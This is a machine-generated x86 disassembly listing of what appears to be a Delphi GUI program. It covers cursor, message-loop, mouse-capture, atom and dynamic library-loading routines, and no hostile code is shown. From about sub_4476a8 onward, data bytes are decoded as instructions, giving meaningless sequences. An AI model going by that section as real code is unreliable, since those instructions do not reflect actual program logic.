cmp [ ebp - 0x10 ] 0x12
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0xb00b
jne r-xdata
cmp [ ebp - 0x10 ] 0x14
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_4423cc
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
dec eax
je r-xdata
call sub_43a42c
push 0x1
xor ecx ecx
xor edx edx
mov eax [ esi + 0x4 ]
call sub_43c8e4
jmp r-xdata
test esi esi
je r-xdata
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_403f5c
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_4466b0
jmp r-xdata
mov edi [ esi + 0x4 ]
mov eax edi
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_440efc
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_4462b0
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406878
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x44 ]
mov [ eax + 0x50 ] edx
mov edx [ ebp - 0x40 ]
mov [ eax + 0x54 ] edx
push ebp
call sub_446738
pop ecx
mov eax [ ebp - 0x4 ]
call sub_4462b0
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406878
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_445258
mov esi eax
test esi esi
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0x2
je r-xdata
xor edx edx
mov eax edi
call sub_43baec
jmp r-xdata
mov eax edi
call sub_457f8c
jmp r-xdata
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_445258
mov esi eax
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_43b56c
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x20 ]
sub eax [ esi + 0x40 ]
add eax eax
sub [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
sub eax [ esi + 0x44 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x18 ]
sub edx [ ebp - 0x20 ]
sub eax edx
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
lea edx [ ebp - 0x48 ]
mov eax esi
call sub_43bbcc
mov edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_403fb0
mov eax [ ebx + 0x8 ]
lea edi [ eax + 0x18 ]
lea esi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
sub eax 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44619c
jmp r-xdata
mov eax [ esi + 0x14 ]
movzx eax [ eax + 0x10 ]
movsx edx [ eax * 2 + rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45968c
push eax
call SetCursor
mov [ ebx + 0xc ] 0x1
jmp r-xdata
push 0x0
push 0x203
push 0x203
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_4423cc
push eax
lea eax [ ebp - 0x3c ]
push eax
call PeekMessageA
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x9b ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
cmp [ eax + 0x5d ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
call sub_43c28c
jmp r-xdata
sub_446bb0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4031f4
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] 0x5
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
add esp 0xfffffff0
call sub_403530
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jge r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov al 0x1
mov [ esi + 0xd ] al
xor edx edx
mov eax esi
call sub_446d24
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
mov eax [ rw-data ]
cmp [ eax ] 0xa
jge r-xdata
sub_446c40
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_446cfc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403214
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_446ca4
push ebx
push esi
mov esi eax
push 0x4b
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x20 ] bl
test bl bl
je r-xdata
pop esi
pop ebx
retn
push 0x0
lea eax [ esi + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
sub_446cd4
push ebx
push ecx
mov ebx eax
push esp
lea eax [ ebx + 0x10 ]
push eax
lea ecx [ ebx + 0x14 ]
lea edx [ ebx + 0x24 ]
lea eax [ ebx + 0x1c ]
call sub_40696c
mov [ ebx + 0x18 ] eax
cmp [ ebx + 0x1c ] 0x0
setne al
mov [ ebx + 0x20 ] al
pop edx
pop ebx
retn
sub_446cfc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_446c70
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
jne r-xdata
push esi
call SetCapture
call ReleaseCapture
jmp r-xdata
sub_446d24
push ebx
mov ebx eax
sub edx 0x1
jb r-xdata
mov eax ebx
call sub_446c88
cmp [ ebx + 0xd ] 0x0
jne r-xdata
sub edx 0x67
je r-xdata
mov eax ebx
call sub_446ca4
pop ebx
retn
mov eax ebx
call sub_446cd4
jmp r-xdata
cmp [ ebx + 0x20 ] 0x0
je r-xdata
jmp r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call SendMessageA
mov [ ebx + 0x10 ] eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
jmp r-xdata
sub_446d88
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
push 0x8000
call SetErrorMode
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_446eee
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
call GetModuleHandleA
mov ebx eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call SetErrorMode
retn
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_44700c
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x3
je r-xdata
test bl bl
jne r-xdata
mov dl 0x1
mov eax esi
call sub_446ff0
cmp [ rw-data ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_446ff0
jmp r-xdata
push esi
call [ rw-data ]
mov edi eax
test edi edi
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax ebx
dec al
je r-xdata
push 0x0
push edi
call [ rw-data ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
push edi
push esi
call [ rw-data ]
push 0x1
push edi
call [ rw-data ]
jmp r-xdata
jmp r-xdata
push 0x1
push edi
call [ rw-data ]
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax [ esp ]
and eax 0xfffffff4
xor edx edx
mov dl bl
movzx edx [ edx + rw-data ]
or eax edx
mov [ esp ] eax
sub_4470fc
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403224
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403224
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
call sub_403224
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_403224
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403f5c
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403f5c
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_447184
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4472fc
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetCurrentProcessId
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_408b70
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_403fb0
mov eax [ rw-data ]
call sub_40441c
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
call GetCurrentThreadId
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
lea edx [ ebp - 0x20 ]
mov ecx 0x1
mov eax r-xdata
call sub_408b70
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_403fb0
mov eax [ rw-data ]
call sub_40441c
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
mov eax [ rw-data ]
call sub_40441c
push eax
call RegisterWindowMessageA
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_413b2c
mov [ rw-data ] eax
call sub_446d88
mov dl 0x1
mov eax [ r-xdata ]
call sub_446bb0
mov [ rw-data ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_458f68
mov edx [ rw-data ]
mov [ edx ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45a04c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x1
call sub_45bc34
mov ecx r-xdata
mov edx sub_438cdc
mov eax [ r-xdata ]
call sub_4132e0
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447303
lea eax [ ebp - 0x10 ]
call sub_403f5c
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_44736c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4473cb
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4473d2
retn
mov eax rw-data
call sub_40ccd0
call sub_4470fc
mov eax rw-data
mov ecx 0x16
mov edx [ r-xdata ]
call sub_4049d8
mov eax rw-data
call sub_403f5c
mov eax rw-data
call sub_403f5c
sub_4473d4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44745a
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447461
retn
call GetVersion
and eax 0xff
cmp ax 0x4
setae [ rw-data ]
call sub_447184
mov eax [ r-xdata ]
call sub_413154
mov eax [ r-xdata ]
call sub_4131f4
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4131a0
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4131a0
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4131a0
sub_4476a8
stc
push ebx
push eax
call [ esi + edi * 2 + 0x44 ]
add [ esi + edi * 2 - 0x7f5fffbc ] bl
inc esp
add al al
add [ eax + eax + 0x11 ] 0x54
inc ebx
jne r-xdata
inc eax
add [ esp + esi + 0x40 ] bl
je r-xdata
inc esp
add [ eax - 0x68 ] dl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ esi + edi * 2 ] al
inc esp
add [ eax + 0x6800413f ] ah
xchg edi eax
inc ecx
push 0x5c004034
xor al 0x40
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
add [ eax ] al
add [ ebx ] al
add [ 0x74617453 ] al
add [ eax ] cl
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x8ae40006
inc esp
add [ eax ] bh
add [ eax ] al
push [ eax + eax ]
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
push es
dec ecx
insd
popad
jae r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060002 ] al
add [ edi + edi * 2 + 0x7ee80044 ] ch
inc esp
add [ ebx ] cl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
or edx [ ecx + eax * 2 + 0x63 ]
je r-xdata
add [ esi + edi - 0x67bfffbf ] bh
inc ecx
add [ eax ] ch
jg r-xdata
outsd
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
loopne r-xdata
add [ eax ] al
arpl [ ebp + 0x74 ] si
sub al 0x10
inc ecx
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0006 ] al
outsb
push ebx
je r-xdata
add al dl
jbe r-xdata
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080004 ] al
outsb
inc ebx
push 0x65676e61
mov [ ebp + 0x44 ] dh
add [ eax ] cl
add bh bh
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090005 ] al
outsb
outsd
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
shl [ esi + 0x44 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x68004477 ] al
add [ eax ] al
add [ eax ] ah
jbe r-xdata
inc ecx
add [ edx ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x77480000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4477 ] dl
add al bl
xor [ eax ] eax
int3
inc ebx
jne r-xdata
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
je r-xdata
inc ebp
js r-xdata
dec eax
add [ eax ] al
dec [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x6e4f0900
add [ eax ] bl
add bh bh
loopne r-xdata
add [ eax - 0x68 ] bl
inc ecx
add [ eax - 0x67ffbe65 ] al
jge r-xdata
add [ eax - 0x65 ] ah
inc ecx
add [ eax + 0x34 ] ah
inc eax
add [ esp + edx * 4 + 0x34680041 ] dh
inc eax
add ah cl
add [ eax + eax + 0x1c ] 0x83
inc esp
add [ eax - 0x69 ] ch
inc ecx
add [ esi + edi - 0x67bfffbf ] bh
dec esp
imul esi [ ebx + 0x74 ] 0x7980c08b
inc esp
add [ edi ] al
or eax 0x6f685354
jb r-xdata
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ eax + edx * 2 ] bh
inc ecx
add [ eax - 0x27ffbec1 ] ah
inc ebx
inc ecx
add al dl
inc edx
inc ecx
add ah ah
push edx
inc ecx
add [ eax ] bl
push ebx
xor al 0x40
inc ebx
push 0x65676e61
mov [ ebp + 0x44 ] dh
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080007 ] al
outsb
push ebp
jo r-xdata
inc ecx
add [ eax - 0x67 ] cl
inc ecx
add [ eax - 0x65 ] bh
inc ecx
add [ eax - 0x68 ] ah
inc ecx
cwde
sub al 0x10
inc ecx
add [ eax ] al
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
add eax 0x74617453
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov eax eax
mov [ edx + 0x44 ] bh
add [ edi ] al
or eax 0x73754354
je r-xdata
add [ eax ] dl
xchg [ eax + eax - 0x58 ] al
test [ eax + eax - 0x1c ] eax
mov [ eax + eax + 0xe ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x640040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
js r-xdata
inc ecx
inc eax
cwde
inc ebx
jne r-xdata
inc ecx
add [ ebx + edx * 2 ] bl
popad
je r-xdata
add al ah
pushfd
inc ecx
add [ esp + ebx * 4 - 0x631bffbf ] dh
inc ecx
add [ esp + ebx * 4 ] al
inc ecx
add [ eax - 0x13ffbe64 ] bl
pushfd
inc ecx
add [ eax - 0x6bffbb7f ] al
add [ eax + eax - 0x58 ] 0xbc004481
add [ eax + eax - 0x30 ] 0xe4004481
add [ eax + eax - 0x8 ] 0xc004481
add [ eax + eax + 0x20 ] 0x82
inc esp
add [ edx + eax * 4 ] dh
inc esp
add [ eax - 0x7e ] cl
inc esp
add [ edx + eax * 4 + 0x44 ] cl
add [ eax - 0x7e ] dl
inc esp
add [ edx + eax * 4 + 0x44 ] dl
add [ eax - 0x7e ] bl
inc esp
add [ edx + eax * 4 + 0x44 ] bl
add [ eax - 0x7e ] ah
inc esp
add [ edx + eax * 4 + 0x44 ] ah
add [ eax - 0x7e ] ch
inc esp
add [ edx + eax * 4 + 0x44 ] ch
add [ eax - 0x7e ] dh
inc esp
add [ edx + eax * 4 + 0x44 ] dh
add [ ebx ] cl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x15e85653
mov edx 0xda8bfffb
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] al
xchg esp eax
adc [ eax ] al
jl r-xdata
add [ ebp + ebx * 4 + 0x7bec0041 ] bl
inc esp
add al ch
xchg [ eax + eax + 0x78 ] eax
fwait
inc ecx
add [ eax - 0x68 ] ah
inc ecx
dec esp
imul esi [ ebx + 0x74 ] r-xdata
mov esp 0x411a
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x79f00000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edi * 2 + 0x44 ] al
add [ eax + 0x447a ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x7a ] ah
inc esp
add [ edx + edi * 2 + 0x44 ] dh
add [ eax + 0x64000000 ] ah
je r-xdata
inc ecx
add [ eax ] ah
push ebx
inc ecx
add [ esi + eax * 2 + 0x54940041 ] bh
inc ecx
add al dh
push esp
inc ecx
add ah al
push ebp
inc ecx
add [ eax ] cl
dec esi
inc ecx
add [ eax ] al
push esi
inc ecx
add [ esi + edx * 2 + 0x41 ] dh
add al dh
mov [ eax + eax - 0x5c ] al
push eax
inc ecx
add [ eax ] bl
inc edx
inc ecx
add [ eax + 0x51 ] al
inc ecx
add [ eax - 0x13ffbeaf ] al
push ecx
inc ecx
add [ eax + 0x46 ] ch
inc ecx
add [ ebx + edx * 2 + 0x41 ] bh
add ah bh
dec eax
inc ecx
add al dl
dec ecx
inc ecx
add [ eax - 0x37ffbead ] bh
push ebx
inc ecx
add [ edx + ecx * 2 ] dh
inc ecx
add [ eax + 0x3400414a ] cl
dec ebx
inc ecx
add ah cl
dec esp
inc ecx
add [ ecx * 2 + 0x4db80041 ] ah
inc ecx
add [ eax ] cl
push ecx
inc ecx
add [ ecx + edx * 2 ] ah
inc ecx
add [ esp + edx * 2 ] bl
inc ecx
add [ edx + edx * 2 + 0x41 ] ch
add [ esi + edx * 2 ] ch
inc ecx
add [ esi + edx * 2 ] bh
inc ecx
add [ 0x6f685354 ] cl
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edi * 2 + 0x44 ] ch
add [ eax ] dh
add [ eax ] al
add ah cl
sbb [ ecx ] eax
push esp
xor al 0x40
add [ eax + 0x34 ] ah
inc eax
lea eax [ eax ]
aam 0x78
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4479 ] al
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419d3c
test bl bl
jle r-xdata
mov edx esi
call sub_447f90
add [ eax ] al
add al [ eax ]
out dx al
add [ eax - 0x68 ] bl
inc ecx
add [ eax + 0x7800419b ] al
add [ eax + eax + 0x5c ] 0x9e
inc ecx
add [ eax ] al
sahf
inc ecx
add [ ebp + ebx * 4 - 0x623bffbf ] dl
inc ecx
add [ eax + 0x4000419d ] bl
jge r-xdata
add [ eax - 0x65 ] ah
inc ecx
add [ eax + 0x34 ] ah
inc eax
add [ esp + edx * 4 + 0x34680041 ] dh
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_447a9a
add [ eax ] bh
jne r-xdata
inc eax
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ esp + ebx * 4 + 0x41 ] cl
add [ eax - 0x64 ] cl
inc ecx
add [ eax - 0x1fffbe64 ] al
pushfd
inc ecx
add [ esp + ebx * 4 - 0x631bffbf ] dh
inc ecx
add [ esp + ebx * 4 ] al
inc ecx
add [ eax - 0x13ffbe64 ] bl
pushfd
inc ecx
add [ eax - 0x6bffbb7f ] al
add [ eax + eax - 0x58 ] 0xbc004481
add [ eax + eax - 0x30 ] 0xe4004481
add [ eax + eax - 0x8 ] 0xc004481
add [ eax + eax + 0x20 ] 0x82
inc esp
add [ edx + eax * 4 ] dh
inc esp
add [ eax - 0x7e ] cl
inc esp
add [ edx + eax * 4 + 0x44 ] cl
add [ eax - 0x7e ] dl
inc esp
add [ edx + eax * 4 + 0x44 ] dl
add [ eax - 0x7e ] bl
inc esp
add [ edx + eax * 4 + 0x44 ] bl
add [ eax - 0x7e ] ah
inc esp
add [ edx + eax * 4 + 0x44 ] ah
add [ eax - 0x7e ] ch
inc esp
add [ edx + eax * 4 + 0x44 ] ch
add [ eax - 0x7e ] dh
inc esp
add [ edx + eax * 4 + 0x44 ] dh
add [ ebx ] cl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x15e85653
mov edx 0xda8bfffb
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
add [ ebx ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x7af80000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x7b ] dh
inc esp
add [ eax ] bl
add [ eax ] al
add [ ebx + 0x41 ] al
add [ esp + esi + 0x40 ] dl
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419d3c
test bl bl
jle r-xdata
mov edx esi
call sub_447f90
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_447b7c
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419d3c
test bl bl
jle r-xdata
mov edx esi
call sub_447f90
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_447bec
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_419850
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebx
call sub_447c94
sub_447c20
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_447bb0
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x5c ]
mov edi [ edx + 0x30 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_413808
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x30 ]
mov ecx ebx
mov edx esi
call sub_413994
sub_447c68
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x58 ]
call sub_404368
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x58 ]
mov edx esi
call sub_403fb0
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x30 ]
sub_447c94
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x5c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_447f90
mov edx ebx
mov eax esi
call sub_447f70
sub_447cbc
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_447c94
sub_447ce8
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_45c9b0
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff3
call sub_403420
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_419dc8
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb040
call sub_438b08
dec eax
